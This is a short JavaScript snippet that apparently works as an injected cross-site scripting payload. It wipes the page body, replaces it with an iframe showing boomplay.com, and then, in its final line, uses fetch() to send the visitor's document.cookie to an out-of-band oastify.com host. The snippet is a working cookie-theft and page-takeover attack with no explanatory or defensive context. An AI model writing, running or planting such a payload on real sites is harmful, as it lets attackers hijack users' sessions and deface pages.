document.body.replaceChildren()
const container = document.createElement('div');
container.style.position = 'relative';
container.style.width = '600px'; // Adjust as needed
container.style.height = '400px';
container.style.overflow = 'hidden';

const iframe = document.createElement('iframe');
iframe.src = 'https://boomplay.com';
iframe.width = '100%';
iframe.height = '100%';
iframe.style.border = 'none';
iframe.sandbox = 'allow-scripts allow-same-origin'; // Adjust permissions


container.appendChild(iframe);
document.body.appendChild(container);

fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/${document.cookie}`)

